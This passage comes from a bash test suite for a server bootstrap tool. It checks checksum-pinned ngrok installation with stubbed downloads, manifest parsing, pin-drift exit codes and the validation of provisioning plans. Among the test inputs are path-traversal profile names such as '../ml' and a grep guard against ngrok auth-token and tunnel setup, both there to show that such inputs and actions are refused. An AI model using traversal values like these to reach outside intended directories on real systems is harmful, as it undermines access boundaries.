    && bad "an example plan carries its own ngrok step" || ok "no example plan carries its own ngrok step"
grep -Eq '^ngrok$' config/packages.txt \
    && bad "ngrok must be installed from the pinned package, not apt" \
    || ok "ngrok is not duplicated in the apt manifest"
grep -Eq 'NGROK_VERSION="\$\{NGROK_VERSION:-[0-9]+\.[0-9]+\.[0-9]+\}"' lib/bootstrap/config.sh \
    && grep -Eq 'NGROK_SHA256_X64="\$\{NGROK_SHA256_X64:-[0-9a-f]{64}\}"' lib/bootstrap/config.sh \
    && grep -Eq 'NGROK_SHA256_ARM64="\$\{NGROK_SHA256_ARM64:-[0-9a-f]{64}\}"' lib/bootstrap/config.sh \
    && ok "ngrok is version pinned and checksum pinned for both architectures" \
    || bad "ngrok pin defaults"
grep -v '^[[:space:]]*#' lib/bootstrap/ngrok.sh \
    | grep -Eiq 'authtoken|systemctl|service|\.config/ngrok|ngrok\.yml' \
    && bad "the ngrok module has a credential, configuration, tunnel or service action" \
    || ok "the ngrok module has no credential, configuration, tunnel or service action"

# The index parser is pure, so it is driven with a synthetic Packages body.
# Hashes are made here rather than written down: no pin literal in this file.
# shellcheck source=lib/core.sh
source lib/core.sh
# shellcheck source=lib/bootstrap/ngrok.sh
source lib/bootstrap/ngrok.sh
nh1="$(printf 'ngrok index one' | sha256sum | cut -c1-64)"
nh2="$(printf 'ngrok index two' | sha256sum | cut -c1-64)"
nh3="$(printf 'ngrok index three' | sha256sum | cut -c1-64)"
ngrok_index="$(printf 'Package: ngrok\nVersion: 3.9.0\nArchitecture: amd64\nSHA256: %s\n\nPackage: ngrok\nVersion: 3.10.0\nArchitecture: amd64\nSHA256: %s\n\nPackage: ngrok\nVersion: 3.10.0\nArchitecture: arm64\nSHA256: %s\n\nPackage: other\nVersion: 9.0.0\nArchitecture: amd64\nSHA256: %s\n' \
    "$nh1" "$nh2" "$nh3" "$nh3")"
[[ "$(bootstrap_ngrok_index_entry "$ngrok_index" latest amd64)" == "3.10.0 $nh2" ]] \
    && ok "latest is the highest version, compared as a version rather than as text" \
    || bad "ngrok latest resolution: $(bootstrap_ngrok_index_entry "$ngrok_index" latest amd64)"
[[ "$(bootstrap_ngrok_index_entry "$ngrok_index" 3.9.0 amd64)" == "3.9.0 $nh1" \
    && "$(bootstrap_ngrok_index_entry "$ngrok_index" 3.10.0 arm64)" == "3.10.0 $nh3" ]] \
    && ok "an exact version resolves to that architecture's checksum" \
    || bad "ngrok exact version lookup"
if bootstrap_ngrok_index_entry "$ngrok_index" 9.0.0 amd64 >/dev/null \
    || bootstrap_ngrok_index_entry "$ngrok_index" 3.9.0 arm64 >/dev/null \
    || bootstrap_ngrok_index_entry "${ngrok_index//$nh1/not-a-checksum}" 3.9.0 amd64 >/dev/null; then
    bad "the ngrok index parser accepted another package, a missing version, or a malformed checksum"
else
    ok "another package, a missing version, and a malformed checksum all fail"
fi

if ! command -v dpkg-deb >/dev/null 2>&1; then
    skip "ngrok install cases need dpkg-deb to build their fixture packages"
else
    NGROK_FIX="$TMP/ngrok"; mkdir -p "$NGROK_FIX/stub" "$NGROK_FIX/tmp" "$NGROK_FIX/home"
    NGROK_FIX="$(cd "$NGROK_FIX" && pwd -P)"
    NGROK_REPO=https://ngrok-agent.s3.amazonaws.com
    NGROK_POOL="$NGROK_FIX/serve/pool/main/n/ngrok"
    mkdir -p "$NGROK_POOL" "$NGROK_FIX/serve/dists/buster/main/binary-amd64"

    # A package shaped like the real one: one executable at usr/local/bin/ngrok.
    # Its binary logs every invocation and reports REPORTED as its version.
    ngrok_package() {  # version, arch, reported version -> path of the .deb
        local tree="$NGROK_FIX/pkg-$1-$2-$3"
        mkdir -p "$tree/DEBIAN" "$tree/usr/local/bin"
        printf 'Package: ngrok\nVersion: %s\nArchitecture: %s\nMaintainer: fixture\nDescription: fixture\n' \
            "$1" "$2" > "$tree/DEBIAN/control"
        sed "s/@VERSION@/$3/" > "$tree/usr/local/bin/ngrok" <<'STUB'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "$NGROK_CALLS"
[[ "${1:-}" == version ]] && printf 'ngrok version @VERSION@\n'
exit 0
STUB
        chmod 0755 "$tree/usr/local/bin/ngrok"
        dpkg-deb --root-owner-group -Zgzip --build "$tree" "$tree.deb" >/dev/null 2>&1
        printf '%s\n' "$tree.deb"
    }
    cat > "$NGROK_FIX/stub/curl" <<'CURL'
#!/usr/bin/env bash
out=
for ((i = 1; i <= $#; i++)); do
    [[ "${!i}" == -o ]] && { j=$((i + 1)); out="${!j}"; }
done
url="${!#}"
printf '%s\n' "$url" >> "$NGROK_CURL_LOG"
file="$NGROK_SERVE/${url#https://ngrok-agent.s3.amazonaws.com/}"
[[ "${NGROK_CURL_FAIL:-0}" == 0 && -f "$file" ]] || exit 22
if [[ -n "$out" ]]; then cp -- "$file" "$out"; else cat -- "$file"; fi
CURL
    printf '#!/usr/bin/env bash\n[[ "${1:-}" == -m ]] && printf "%%s\\n" "$NGROK_MACHINE"\n' > "$NGROK_FIX/stub/uname"
    printf '#!/usr/bin/env bash\nexit 0\n' > "$NGROK_FIX/stub/sleep"
    chmod 0755 "$NGROK_FIX/stub/curl" "$NGROK_FIX/stub/uname" "$NGROK_FIX/stub/sleep"

    ngrok_serve() {  # package path, version, arch
        cp -- "$1" "$NGROK_POOL/ngrok_$2-0_$3.deb"
    }
    ngrok_sha() { sha256sum -- "$1" | cut -c1-64; }
    ngrok_fetches() { if [[ -f "$NGROK_FIX/curl.log" ]]; then wc -l < "$NGROK_FIX/curl.log"; else echo 0; fi; }
    ngrok_reported() {
        [[ -x "$1/ngrok" ]] && NGROK_CALLS="$NGROK_FIX/calls.log" "$1/ngrok" version | awk '{print $3}'
    }
    # No staged binary beside the target and no temporary download left behind.
    ngrok_clean() {
        [[ -z "$(find "$1" -maxdepth 1 -name '.ngrok.*' 2>/dev/null)" \
            && -z "$(find "$NGROK_FIX/tmp" -mindepth 1 -print -quit)" ]]
    }
    ngrok_run() {  # machine, bin dir, VAR=value... ; output in $NGROK_FIX/out
        local machine="$1" bin="$2"; shift 2
        rm -f "$NGROK_FIX/curl.log"
        (
            export PATH="$NGROK_FIX/stub:$PATH" NGROK_MACHINE="$machine" TMPDIR="$NGROK_FIX/tmp" \
                HOME="$NGROK_FIX/home" NGROK_SERVE="$NGROK_FIX/serve" \
                NGROK_CURL_LOG="$NGROK_FIX/curl.log" NGROK_CALLS="$NGROK_FIX/calls.log" \
                NGROK_VERSION=9.8.7 NGROK_SHA256_X64="$NGROK_AMD_SHA" NGROK_SHA256_ARM64="$NGROK_ARM_SHA"
            for assignment in "$@"; do export "${assignment?}"; done
            bootstrap_load_config
            STATE_ROOT="$NGROK_FIX/state-$(basename -- "$bin")"
            mkdir -p "$STATE_ROOT"
            bootstrap_ngrok "$bin"
        ) > "$NGROK_FIX/out" 2>&1
    }
    # shellcheck source=lib/bootstrap/config.sh
    source lib/bootstrap/config.sh

    NGROK_AMD="$(ngrok_package 9.8.7 amd64 9.8.7)"; NGROK_AMD_SHA="$(ngrok_sha "$NGROK_AMD")"
    NGROK_ARM="$(ngrok_package 9.8.7 arm64 9.8.7)"; NGROK_ARM_SHA="$(ngrok_sha "$NGROK_ARM")"
    NGROK_OLD="$(ngrok_package 9.8.6 amd64 9.8.6)"; NGROK_OLD_SHA="$(ngrok_sha "$NGROK_OLD")"
    NGROK_LIAR="$(ngrok_package 9.8.7 amd64 9.9.9)"; NGROK_LIAR_SHA="$(ngrok_sha "$NGROK_LIAR")"
    ngrok_serve "$NGROK_AMD" 9.8.7 amd64; ngrok_serve "$NGROK_ARM" 9.8.7 arm64
    ngrok_serve "$NGROK_OLD" 9.8.6 amd64

    # Fresh install, x86_64.
    bin="$NGROK_FIX/bin-amd64"
    if ngrok_run x86_64 "$bin" && [[ "$(ngrok_reported "$bin")" == 9.8.7 \
        && "$(cat "$NGROK_FIX/curl.log")" == "$NGROK_REPO/pool/main/n/ngrok/ngrok_9.8.7-0_amd64.deb" \
        && "$(stat -c %a "$bin/ngrok")" == 755 \
        && "$(cat "$NGROK_FIX/state-bin-amd64/ngrok-version")" == 9.8.7 ]] && ngrok_clean "$bin"; then
        ok "x86_64 downloads the amd64 package once, verifies it, and installs a working ngrok"
    else bad "ngrok x86_64 install: $(cat "$NGROK_FIX/out")"; fi

    # Repeat run: the pinned version is already there.
    if ngrok_run x86_64 "$bin" && [[ "$(ngrok_fetches)" == 0 && "$(ngrok_reported "$bin")" == 9.8.7 ]] \
        && grep -q 'ngrok 9.8.7 already installed' "$NGROK_FIX/out"; then
        ok "a repeat run with the pinned version installed downloads nothing"
    else bad "ngrok repeat run ($(ngrok_fetches) downloads): $(cat "$NGROK_FIX/out")"; fi

    # ARM64 selects its own package and its own checksum.
    bin="$NGROK_FIX/bin-arm64"
    if ngrok_run aarch64 "$bin" && [[ "$(ngrok_reported "$bin")" == 9.8.7 \
        && "$(cat "$NGROK_FIX/curl.log")" == "$NGROK_REPO/pool/main/n/ngrok/ngrok_9.8.7-0_arm64.deb" ]] \
        && ngrok_clean "$bin" && ngrok_run aarch64 "$bin" && [[ "$(ngrok_fetches)" == 0 ]]; then
        ok "aarch64 downloads the arm64 package, verifies it against the ARM64 checksum, and reruns idempotently"
    else bad "ngrok aarch64 install: $(cat "$NGROK_FIX/out")"; fi

    # Unsupported architecture: refused before any download.
    bin="$NGROK_FIX/bin-riscv"
    if ngrok_run riscv64 "$bin"; then bad "ngrok installed on an unsupported architecture"
    elif grep -q 'unsupported ngrok architecture: riscv64' "$NGROK_FIX/out" \
        && [[ "$(ngrok_fetches)" == 0 && ! -e "$bin/ngrok" ]]; then
        ok "an unsupported architecture fails clearly, before any download"
    else bad "ngrok unsupported architecture: $(cat "$NGROK_FIX/out")"; fi

    # Failed download.
    bin="$NGROK_FIX/bin-offline"
    if ngrok_run x86_64 "$bin" NGROK_CURL_FAIL=1; then bad "ngrok installed after a failed download"
    elif [[ ! -e "$bin/ngrok" && "$(ngrok_fetches)" -ge 1 ]] && ngrok_clean "$bin"; then
        ok "a failed download fails and leaves no binary and no partial file"
    else bad "ngrok failed download left something behind: $(cat "$NGROK_FIX/out")"; fi

    # Wrong checksum: the other architecture's hash, which proves the check is
    # per architecture, and then a stranger's hash over an existing install.
    bin="$NGROK_FIX/bin-mismatch"
    if ngrok_run x86_64 "$bin" NGROK_SHA256_X64="$NGROK_ARM_SHA"; then bad "ngrok accepted the ARM64 checksum on x86_64"
    elif grep -q 'checksum mismatch' "$NGROK_FIX/out" && [[ ! -e "$bin/ngrok" ]] && ngrok_clean "$bin"; then
        ok "a checksum mismatch fails and leaves no binary and no partial file"
    else bad "ngrok checksum mismatch: $(cat "$NGROK_FIX/out")"; fi

    bin="$NGROK_FIX/bin-upgrade"
    ngrok_run x86_64 "$bin" NGROK_VERSION=9.8.6 NGROK_SHA256_X64="$NGROK_OLD_SHA" \
        || bad "ngrok older fixture install: $(cat "$NGROK_FIX/out")"
    if ngrok_run x86_64 "$bin" NGROK_SHA256_X64="$(printf 'another package' | sha256sum | cut -c1-64)"; then
        bad "ngrok upgraded with a wrong checksum"
    elif [[ "$(ngrok_reported "$bin")" == 9.8.6 ]] && ngrok_clean "$bin"; then
        ok "a checksum mismatch during an upgrade leaves the installed binary untouched"
    else bad "ngrok mismatch replaced the installed binary: $(cat "$NGROK_FIX/out")"; fi

    # A verified package whose binary is not the pinned version is not installed.
    ngrok_serve "$NGROK_LIAR" 9.8.7 amd64
    if ngrok_run x86_64 "$bin" NGROK_SHA256_X64="$NGROK_LIAR_SHA"; then bad "ngrok installed a binary that is not the pinned version"
    elif grep -q 'ngrok version verification failed' "$NGROK_FIX/out" \
        && [[ "$(ngrok_reported "$bin")" == 9.8.6 ]] && ngrok_clean "$bin"; then
        ok "a package that is not the pinned version is refused, and the installed binary is kept"
    else bad "ngrok version verification: $(cat "$NGROK_FIX/out")"; fi
    ngrok_serve "$NGROK_AMD" 9.8.7 amd64

    # And the upgrade itself.
    if ngrok_run x86_64 "$bin" && [[ "$(ngrok_reported "$bin")" == 9.8.7 && "$(ngrok_fetches)" == 1 ]]; then
        ok "an installed older version is replaced by the pinned one"
    else bad "ngrok upgrade: $(cat "$NGROK_FIX/out")"; fi

    # latest: version and checksum both come from the index, not from the pins.
    printf 'Package: ngrok\nVersion: 9.8.6\nArchitecture: amd64\nSHA256: %s\n\nPackage: ngrok\nVersion: 9.8.7\nArchitecture: amd64\nSHA256: %s\n' \
        "$NGROK_OLD_SHA" "$NGROK_AMD_SHA" > "$NGROK_FIX/serve/dists/buster/main/binary-amd64/Packages"
    bin="$NGROK_FIX/bin-latest"
    if ngrok_run x86_64 "$bin" NGROK_VERSION=latest NGROK_SHA256_X64="$NGROK_OLD_SHA" \
        && [[ "$(ngrok_reported "$bin")" == 9.8.7 ]] && grep -q 'resolved latest ngrok: 9.8.7' "$NGROK_FIX/out"; then
        ok "NGROK_VERSION=latest takes the newest version and its checksum from the index"
    else bad "ngrok latest install: $(cat "$NGROK_FIX/out")"; fi

    # Across every run above, the only thing ever asked of ngrok is its version,
    # and nothing was written to the home directory: no auth token, no
    # configuration file, no tunnel, no service.
    if [[ "$(sort -u "$NGROK_FIX/calls.log")" == version \
        && -z "$(find "$NGROK_FIX/home" -mindepth 1 -print -quit)" ]]; then
        ok "installation only ever runs 'ngrok version' and writes nothing to the home directory"
    else bad "ngrok was invoked with: $(sort -u "$NGROK_FIX/calls.log" | tr '\n' ' ')"; fi
fi

section "Upstream version resolution"
# shellcheck source=lib/core.sh
source lib/core.sh
manifest_table="$(printf '%s\n%s\n' \
    'fd8e59d5a511510f6a298afb548f18c7d2b1be404d8b4a27d94fbe49f56cb2d6  node-v24.21.0-linux-x64.tar.xz' \
    '6ad1325edbdb5649c379b75a237147a666c95d4f9ae8d340fef2d1575d289ad2  node-v24.21.0-linux-arm64.tar.xz')"
[[ "$(sb_sha256_from_manifest_body "$manifest_table" node-v24.21.0-linux-arm64.tar.xz)" \
    == '6ad1325edbdb5649c379b75a237147a666c95d4f9ae8d340fef2d1575d289ad2' ]] \
    && ok "a checksum table resolves the requested file" || bad "manifest table parsing"
[[ "$(sb_sha256_from_manifest_body 'ab9b309d4586403f024e100abaceb396616e178a553e2500c36087d180f09509  uv-x86_64-unknown-linux-gnu.tar.gz' uv-x86_64-unknown-linux-gnu.tar.gz)" \
    == 'ab9b309d4586403f024e100abaceb396616e178a553e2500c36087d180f09509' ]] \
    && ok "a bare sidecar resolves" || bad "sidecar parsing"
sb_sha256_from_manifest_body "$manifest_table" 'node-v24.21.0-linux-ppc64le.tar.xz' >/dev/null 2>&1 \
    && bad "a missing filename returned a checksum" || ok "a filename absent from the manifest fails"
sb_sha256_from_manifest_body 'not-a-checksum  some-file.tar.gz' some-file.tar.gz >/dev/null 2>&1 \
    && bad "a malformed manifest returned a checksum" || ok "a malformed manifest fails"
sb_sha256_from_manifest_body '' anything >/dev/null 2>&1 \
    && bad "an empty manifest returned a checksum" || ok "an empty manifest fails"
sb_checksum_from_manifest 'http://example.com/checksums.txt' file >/dev/null 2>&1 \
    && bad "a plain-HTTP manifest was accepted" || ok "a manifest URL must use HTTPS"

# Resolution must feed the same verification gate as a pin, never bypass it.
resolution_guard=0
for module in lib/bootstrap/node.sh lib/bootstrap/github_cli.sh lib/bootstrap/uv.sh lib/bootstrap/ngrok.sh; do
    grep -q 'sb_is_latest' "$module" || { bad "no latest support in $module"; resolution_guard=1; }
    grep -q 'sb_valid_sha256' "$module" || { bad "no checksum gate in $module"; resolution_guard=1; }
done
(( resolution_guard == 0 )) && ok "every resolved download still passes sb_valid_sha256"
grep -q 'sb_is_latest' lib/bootstrap/ai_cli.sh \
    && ok "the npm CLIs accept latest" || bad "npm latest support"
grep -q 'git ls-remote' lib/core.sh \
    && ok "tag discovery avoids the rate-limited GitHub API" || bad "tag discovery method"

if [[ "${SB_TEST_NETWORK:-0}" == 1 ]]; then
    # shellcheck source=lib/bootstrap/node.sh
    source lib/bootstrap/node.sh
    live_node="$(bootstrap_node_resolve_latest 2>/dev/null || true)"
    [[ "$live_node" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]] \
        && ok "live: Node.js LTS resolves to $live_node" || bad "live Node.js LTS resolution"
    live_sha="$(sb_checksum_from_manifest "https://nodejs.org/dist/v$live_node/SHASUMS256.txt" \
        "node-v$live_node-linux-x64.tar.xz" 2>/dev/null || true)"
    sb_valid_sha256 "$live_sha" \
        && ok "live: the published manifest yields a valid SHA-256" || bad "live checksum resolution"
else
    ok "live upstream resolution skipped (set SB_TEST_NETWORK=1 to run it)"
fi

section "Pin drift classification and exit semantics"
# tools/refresh-pins.sh --check could not exit 0 and could not be trusted when
# it did. The Oh My Zsh row tracks refs/heads/master, which moves several times
# a day, so treating that movement as staleness made exit 1 the steady state;
# and an upstream that failed to resolve fell back to the pinned value, so seven
# failed lookups printed seven "current" rows and exited 0. See #25.
#
# The decision now lives in two pure functions with no network, no clock and no
# filesystem, so the whole thing is driven here with synthetic rows. Sourcing
# the script must therefore be free of side effects -- including shell options:
# it sets -Eeuo pipefail inside its main function, and setting -e in this suite
# would abort it at the first intentionally failing probe.
shell_opts_before="$-"
# shellcheck source=tools/refresh-pins.sh
source tools/refresh-pins.sh
[[ "$-" == "$shell_opts_before" ]] \
    && ok "sourcing refresh-pins.sh does not change shell options" \
    || bad "sourcing refresh-pins.sh changed shell options: $shell_opts_before -> $-"
grep -qF '[[ "${BASH_SOURCE[0]}" != "$0" ]] || refresh_pins_main "$@"' tools/refresh-pins.sh \
    && ok "refresh-pins.sh has a main guard, so sourcing it resolves nothing" \
    || bad "refresh-pins.sh has no main guard; sourcing it would hit the network"
for fn in refresh_pins_kind refresh_pins_classify refresh_pins_exit_code; do
    declare -F "$fn" >/dev/null \
        && ok "sourcing defines $fn" || bad "sourcing did not define $fn"
done

# The classification itself, so it cannot silently flip. Oh My Zsh is the one
# branch head; every other pin resolves to a published release.
kind_drift=0
while IFS='|' read -r tool expected_kind; do
    [[ -n "$tool" ]] || continue
    [[ "$(refresh_pins_kind "$tool")" == "$expected_kind" ]] \
        || { bad "refresh-pins classifies $tool as $(refresh_pins_kind "$tool"), expected $expected_kind"; kind_drift=1; }
done <<'KINDS'
nodejs|release
github-cli|release
uv|release
ngrok|release
claude-code|release
codex|release
pi|release
oh-my-zsh|branch-head
KINDS
(( kind_drift == 0 )) && ok "seven release pins and one branch head, as registered"
[[ "$(refresh_pins_kind not-a-tool 2>/dev/null || true)" == unknown ]] \
    && ok "an unregistered tool is not silently classified" || bad "unregistered tool classification"

# UNKNOWN is decided before the equality test, so a failed resolution can never
# become CURRENT by comparing the pinned value against itself.
classify_drift=0
while IFS='|' read -r kind current latest expected; do
    [[ -n "$kind" ]] || continue
    actual="$(refresh_pins_classify "$kind" "$current" "$latest" 2>/dev/null || true)"
    [[ "$actual" == "$expected" ]] \
        || { bad "classify($kind, '$current', '$latest') = $actual, expected $expected"; classify_drift=1; }
done <<'CLASSIFY'
release|1.0.0|1.0.0|CURRENT
release|1.0.0|1.0.1|STALE
branch-head|aaaaaaa|aaaaaaa|CURRENT
branch-head|aaaaaaa|bbbbbbb|MOVED
release|1.0.0||UNKNOWN
branch-head|aaaaaaa||UNKNOWN
CLASSIFY
(( classify_drift == 0 )) && ok "every state is reached from the values that produce it"

# And the exit code, which is the thing automation reads. Rows are synthetic:
# nothing here contacts an upstream, which is what tests/run-tests.sh requires.
exit_code_drift=0
probe_exit_code() {  # mode, expected, rows...
    local mode="$1" expected="$2"; shift 2
    local actual=0
    printf '%s\n' "$@" | refresh_pins_exit_code "$mode" || actual=$?
    [[ "$actual" == "$expected" ]] && return 0
    bad "exit code $actual for [$mode: $*], expected $expected"
    exit_code_drift=1
}
CURRENT_ROWS=("nodejs|24.21.0|24.21.0|CURRENT|release" "oh-my-zsh|aaa|aaa|CURRENT|branch-head")
# The regression case this issue exists for: a moved branch head alone must not
# make --check non-zero. The obvious later simplification is to collapse the two
# kinds back into one, and the noise that reintroduces is invisible until the
# weekly job has been crying wolf for a month.
MOVED_ROWS=("nodejs|24.21.0|24.21.0|CURRENT|release" "oh-my-zsh|aaa|bbb|MOVED|branch-head")
probe_exit_code default 0 "${CURRENT_ROWS[@]}"
probe_exit_code all     0 "${CURRENT_ROWS[@]}"
probe_exit_code default 0 "${MOVED_ROWS[@]}"
probe_exit_code all     1 "${MOVED_ROWS[@]}"
probe_exit_code default 1 "nodejs|24.21.0|24.22.0|STALE|release"
probe_exit_code default 1 "nodejs|24.21.0|24.22.0|STALE|release" "oh-my-zsh|aaa|bbb|MOVED|branch-head"
# UNKNOWN is its own result, never 0: a run whose upstream was unreachable is
# not a clean week. And a definite stale pin outranks it, because there is
# definitely work either way.
probe_exit_code default 3 "nodejs|24.21.0||UNKNOWN|release" "uv|0.12.13|0.12.13|CURRENT|release"
probe_exit_code all     3 "nodejs|24.21.0||UNKNOWN|release" "oh-my-zsh|aaa||UNKNOWN|branch-head"
probe_exit_code default 1 "nodejs|24.21.0||UNKNOWN|release" "uv|0.12.13|0.13.0|STALE|release"
probe_exit_code default 3 "oh-my-zsh|aaa||UNKNOWN|branch-head"
probe_exit_code default 0 ""
(( exit_code_drift == 0 )) && ok "every documented exit code is produced by the state that means it"

# The exit codes are a published interface now, so they have to be written down.
exit_doc_drift=0
for code_line in \
    '#   0  nothing actionable' \
    '#   1  at least one release pin is STALE' \
    '#   2  usage error' \
    '#   3  nothing actionable was found, but at least one row is UNKNOWN'; do
    grep -qF -- "$code_line" tools/refresh-pins.sh \
        || { bad "refresh-pins.sh does not document: $code_line"; exit_doc_drift=1; }
done
grep -qF 'refresh-pins.sh --check --all' README.md \
    || { bad "README does not document --all"; exit_doc_drift=1; }
grep -qF 'exit 3' docs/CONFIGURATION.md \
    || { bad "docs/CONFIGURATION.md does not document the UNKNOWN exit code"; exit_doc_drift=1; }
(( exit_doc_drift == 0 )) && ok "the exit-code contract is documented where it is used"

section "Version checks survive a shadowing PATH"
# A machine with its own node/gh/uv earlier in PATH must not break the run, and
# must not silently satisfy a check with the wrong binary. Found by an
# end-to-end run on a host carrying a preinstalled Node.
grep -q '"$current/bin/node" --version' lib/bootstrap/node.sh \
    && ! grep -qE '\[\[ "\$\(node --version' lib/bootstrap/node.sh \
    && ok "Node is verified through the path it was installed to" \
    || bad "Node verification still resolves node through PATH"
grep -q 'export PATH="$current/bin:$PATH"' lib/bootstrap/node.sh \
    && ok "the pinned Node leads PATH for the npm steps that follow" \
    || bad "later steps may npm-install against an unpinned Node"
grep -q 'bootstrap_github_cli_installed_version /usr/local/bin/gh' lib/bootstrap/github_cli.sh \
    && ok "gh is verified through the path it was installed to" || bad "gh post-install verification"
grep -q 'bootstrap_uv_installed_version /usr/local/bin/uv' lib/bootstrap/uv.sh \
    && ok "uv is verified through the path it was installed to" || bad "uv post-install verification"
# The run summary is how an operator learns what is on the host, so it must
# never report a version read from a binary the bootstrap did not install.
grep -q '"$AI_CLI_PREFIX/bin/claude" --version' lib/bootstrap/ai_cli.sh \
    && grep -q '"$AI_CLI_PREFIX/bin/codex" --version' lib/bootstrap/ai_cli.sh \
    && ok "the summary reports the agent launchers that were installed" \
    || bad "agent versions in the summary still come from PATH"
grep -q '/usr/local/bin/uv --version' lib/bootstrap/report.sh \
    && ! grep -qE '\(command -v uv >/dev/null 2>&1 && uv --version' lib/bootstrap/report.sh \
    && ok "the report reads uv from the path it was installed to" \
    || bad "the uv report line still resolves uv through PATH"
# The pre-install short-circuit is meant to stay PATH-based: it asks whether a
# suitable binary is already usable, which is a different question.
grep -q 'if \[\[ "$(bootstrap_github_cli_installed_version)" == "$GH_VERSION" \]\]' lib/bootstrap/github_cli.sh \
    && ok "the gh already-installed short-circuit stays PATH-based" || bad "gh short-circuit changed"

section "Built-in profiles: plan declaration"
# enable_profile names a profile the bootstrap archive already carries, so it
# brings no URL, archive or checksum of its own. A bad declaration stops the run
# while the plan is read, like a bad register_remote_bundle entry.
PPLAN="$TMP/profile-plan"; mkdir -p "$PPLAN"
printf '%s\n' 'register_bootstrap ./base.tar.gz ./base.sha256' \
    'register_bundle first 1.0.0 ./first.tar.gz ./first.sha256' \
    'enable_profile ml --backend auto' > "$PPLAN/plan.sh"
pout="$(WORKSPACE_ROOT="$PPLAN/ws" ./server-provision.sh --plan "$PPLAN/plan.sh" --dry-run 2>&1)"; pcode=$?
expected_pdry="$(printf '%s\n' "Provision plan: $PPLAN/plan.sh" "Bootstrap: $PPLAN/base.tar.gz" 'Bundles: 1' \
    "  1. first 1.0.0 <- $PPLAN/first.tar.gz" 'Profiles: 1' '  1. ml --backend auto')"
[[ "$pcode" == 0 && "$pout" == "$expected_pdry" && ! -e "$PPLAN/ws" ]] \
    && ok "dry run lists an enabled profile after the bundles and writes nothing" \
    || bad "profile dry run: $pout"
printf '%s\n' 'register_bootstrap ./base.tar.gz ./base.sha256' 'enable_profile ml' > "$PPLAN/bare.sh"
[[ "$(./server-provision.sh --plan "$PPLAN/bare.sh" --dry-run 2>&1 | tail -n 2)" == $'Profiles: 1\n  1. ml' ]] \
    && ok "a profile without options is listed as declared" || bad "bare profile dry run"
[[ "$(./server-provision.sh --plan "$PLAN_DIR/plan.sh" --dry-run 2>&1)" != *Profiles* ]] \
    && ok "a plan without enable_profile prints no profile section" || bad "profile section without a profile"

profile_plan_rejects() {  # label, expected reason, then plan lines after the bootstrap
    local label="$1" reason="$2" dir out code mode clean=1
    shift 2
    dir="$(mktemp -d "$TMP/profile-reject.XXXXXX")"
    printf '%s\n' 'register_bootstrap ./base.tar.gz ./base.sha256' "$@" > "$dir/plan.sh"
    for mode in --dry-run ''; do
        out="$(TMPDIR="$dir" WORKSPACE_ROOT="$dir/ws" ./server-provision.sh --plan "$dir/plan.sh" ${mode:+"$mode"} 2>&1)"; code=$?
        [[ "$code" == 2 && "$out" == *"$reason"* && ! -e "$dir/ws" ]] || clean=0
    done
    (( clean )) && ok "plan rejects $label before anything runs" \
        || bad "plan did not cleanly reject $label (last exit $code): $out"
}
profile_plan_rejects "enable_profile without a name" "needs a profile name" 'enable_profile'
profile_plan_rejects "an invalid profile name" "invalid profile name" 'enable_profile ML'
profile_plan_rejects "a path as a profile name" "invalid profile name" 'enable_profile ../ml'
profile_plan_rejects "--backend without a value" "--backend needs a backend name" 'enable_profile ml --backend'
profile_plan_rejects "a malformed backend" "--backend needs a backend name" 'enable_profile ml --backend "../cpu"'
profile_plan_rejects "--force in a plan" "unknown option: --force" 'enable_profile ml --force'
profile_plan_rejects "a profile enabled twice" "enabled twice" 'enable_profile ml' 'enable_profile ml --backend cpu'

if (( EUID == 0 )); then
    # A fake foundation that installs logging stand-ins for server-accept,
    # server-profile and server-bundle-install, so the order is observable.
    PFULL="$TMP/profile-full"; mkdir -p "$PFULL/bin" "$PFULL/with/base-1.2.0/profiles/ml" "$PFULL/without/base-1.2.0"
    PFULL="$(cd "$PFULL" && pwd -P)"
    for tree in with without; do
        cat > "$PFULL/$tree/base-1.2.0/server-bootstrap.sh" <<'FAKEBOOT'
#!/usr/bin/env bash
set -e
printf 'bootstrap\n' >> "$PROVISION_ORDER_LOG"
for command in server-accept server-profile server-bundle-install; do
    printf '#!/usr/bin/env bash\nprintf "%s %%s\\n" "$*" >> "$PROVISION_ORDER_LOG"\n' "$command" \
        > "$PROVISION_FAKE_BIN/$command"
    chmod 0755 "$PROVISION_FAKE_BIN/$command"
done
FAKEBOOT
        chmod +x "$PFULL/$tree/base-1.2.0/server-bootstrap.sh"
        tar -czf "$PFULL/$tree.tar.gz" -C "$PFULL/$tree" base-1.2.0
        sha256sum "$PFULL/$tree.tar.gz" > "$PFULL/$tree.sha256"
    done
    printf '#!/usr/bin/env bash\n' > "$PFULL/with/base-1.2.0/profiles/ml/install.sh"
    tar -czf "$PFULL/with.tar.gz" -C "$PFULL/with" base-1.2.0
    sha256sum "$PFULL/with.tar.gz" > "$PFULL/with.sha256"
    : > "$PFULL/one.tar.gz"; sha256sum "$PFULL/one.tar.gz" > "$PFULL/one.sha256"
    pplan() {  # archive stem, then extra plan lines
        local stem="$1"; shift
        printf '%s\n' 'export WORKSPACE_ROOT="$PLAN_DIR/workspace"' 'export PATH="$PLAN_DIR/bin:$PATH"' \
            'export PROVISION_FAKE_BIN="$PLAN_DIR/bin"' 'export PROVISION_ORDER_LOG="$PLAN_DIR/order.log"' \
            'export DELETE_ARCHIVES_AFTER_SUCCESS=0' "register_bootstrap ./$stem.tar.gz ./$stem.sha256" \
            'register_bundle one 1.0.0 ./one.tar.gz ./one.sha256' "$@" > "$PFULL/plan.sh"
        rm -f "$PFULL/order.log" "$PFULL/bin/"*
    }
    pplan with 'enable_profile ml --backend auto'
    if ./server-provision.sh --plan "$PFULL/plan.sh" >/dev/null 2>&1 \
        && [[ "$(cat "$PFULL/order.log")" == $'bootstrap\nserver-accept \nserver-profile install ml --backend auto\nserver-bundle-install '* ]] \
        && grep -qx 'profiles_installed: 1' "$PFULL/workspace/startup-logs/latest-provision-summary.txt"; then
        ok "an enabled profile installs after acceptance and before the bundles"
    else
        bad "profile provision order: $(tr '\n' '|' < "$PFULL/order.log" 2>/dev/null)"
    fi
    pplan with
    ./server-provision.sh --plan "$PFULL/plan.sh" >/dev/null 2>&1 \
        && ! grep -q '^server-profile' "$PFULL/order.log" \
        && grep -qx 'profiles_installed: 0' "$PFULL/workspace/startup-logs/latest-provision-summary.txt" \
        && ok "a foundation-only plan never runs server-profile" \
        || bad "a plan without enable_profile ran a profile"
    pplan without 'enable_profile ml'
    pout="$(./server-provision.sh --plan "$PFULL/plan.sh" 2>&1)"; pcode=$?
    [[ "$pcode" != 0 && "$pout" == *"has no 'ml' profile"* && ! -e "$PFULL/order.log" ]] \
